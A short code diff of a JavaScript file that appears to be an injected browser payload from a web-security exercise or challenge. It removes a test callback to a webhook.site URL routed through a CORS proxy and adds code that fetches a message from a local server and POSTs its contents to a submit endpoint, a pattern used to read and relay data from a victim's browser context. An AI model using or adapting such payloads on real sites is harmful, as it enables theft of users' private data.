@@ -1,11 +1,13 @@
-console.log("WERE IN");
-
-fetch('https://api.allorigins.win/get?url=' + encodeURIComponent('https://webhook.site/d5c2d46d-88cd-4046-88b0-ef84b1511227'), {
-  headers: {
-    'X-Custom-Header': 'test1'
-  }
-})
-
-
-
-
+fetch("http://127.0.0.1:80/message/3").then((r) => {
+    return r.text();
+}).then((x) => {
+    fetch("http://127.0.0.1:80/submit", {
+        "headers": {
+            "content-type": "application/json"
+        },
+        "body": x,
+        "method": "POST",
+        "mode": "cors",
+        "credentials": "omit"
+    });
+});
